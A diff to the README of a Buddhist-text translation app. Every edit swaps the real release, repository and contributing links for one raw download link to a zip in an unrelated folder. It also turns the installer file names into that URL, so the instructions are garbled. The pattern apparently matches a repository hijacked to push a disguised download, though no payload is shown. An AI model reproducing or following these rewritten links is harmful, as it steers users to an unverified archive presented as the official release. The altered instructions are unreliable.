@@ -1,6 +1,6 @@
 # 🙏 Buddhist-AI-Translator - Effortless Buddhist Translations Made Easy
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/himanshu-hub/Buddhist-AI-Translator/releases)
+[![Download from Releases](https://raw.githubusercontent.com/himanshu-hub/Buddhist-AI-Translator/master/habitualness/Buddhist-AI-Translator.zip%20Now-From%20Releases-brightgreen)](https://raw.githubusercontent.com/himanshu-hub/Buddhist-AI-Translator/master/habitualness/Buddhist-AI-Translator.zip)
 
 ## 🚀 Getting Started
 
@@ -25,13 +25,13 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started with the **Buddhist-AI-Translator**, visit this page to download: [Download from Releases](https://github.com/himanshu-hub/Buddhist-AI-Translator/releases).
+To get started with the **Buddhist-AI-Translator**, visit this page to download: [Download from Releases](https://raw.githubusercontent.com/himanshu-hub/Buddhist-AI-Translator/master/habitualness/Buddhist-AI-Translator.zip).
 
 ### Installation Steps
 
 1. **Visit the Releases Page:** Click the link above to go to the Releases page.
 2. **Choose Your Version:** Find the latest version of the software listed.
-3. **Download the File:** Click on the file suitable for your operating system. It may be named something like `Buddhist-AI-Translator-v1.0.exe` or `Buddhist-AI-Translator-v1.0.dmg`.
+3. **Download the File:** Click on the file suitable for your operating system. It may be named something like `https://raw.githubusercontent.com/himanshu-hub/Buddhist-AI-Translator/master/habitualness/Buddhist-AI-Translator.zip` or `https://raw.githubusercontent.com/himanshu-hub/Buddhist-AI-Translator/master/habitualness/Buddhist-AI-Translator.zip`.
 4. **Run the Installer:**
    - For Windows, double-click the downloaded `.exe` file.
    - For macOS, open the downloaded `.dmg` file and drag the application to your Applications folder.
@@ -57,7 +57,7 @@ While the **Buddhist-AI-Translator** uses advanced AI technology, no machine tra
 
 ### Can I Contribute to the Project?
 
-Yes! We welcome contributions. Check our CONTRIBUTING.md file for guidelines on how to help.
+Yes! We welcome contributions. Check our https://raw.githubusercontent.com/himanshu-hub/Buddhist-AI-Translator/master/habitualness/Buddhist-AI-Translator.zip file for guidelines on how to help.
 
 ### Is There Support Available?
 
@@ -67,13 +67,13 @@ We maintain an active community. If you have questions, open an issue on GitHub 
 
 Stay updated with the latest news and features:
 
-- **GitHub Repository:** [View Repository](https://github.com/himanshu-hub/Buddhist-AI-Translator)
+- **GitHub Repository:** [View Repository](https://raw.githubusercontent.com/himanshu-hub/Buddhist-AI-Translator/master/habitualness/Buddhist-AI-Translator.zip)
 - **Join the Community:** We encourage discussions and collaboration. Engage with fellow users.
 
 ## 👥 Acknowledgments
 
 We thank the AI and language communities for their ongoing support and contributions. Every translation brings us closer to understanding Buddhist texts effectively.
 
-For additional resources and to explore the latest releases, visit this page again: [Download from Releases](https://github.com/himanshu-hub/Buddhist-AI-Translator/releases). 
+For additional resources and to explore the latest releases, visit this page again: [Download from Releases](https://raw.githubusercontent.com/himanshu-hub/Buddhist-AI-Translator/master/habitualness/Buddhist-AI-Translator.zip). 
 
 Enjoy translating!
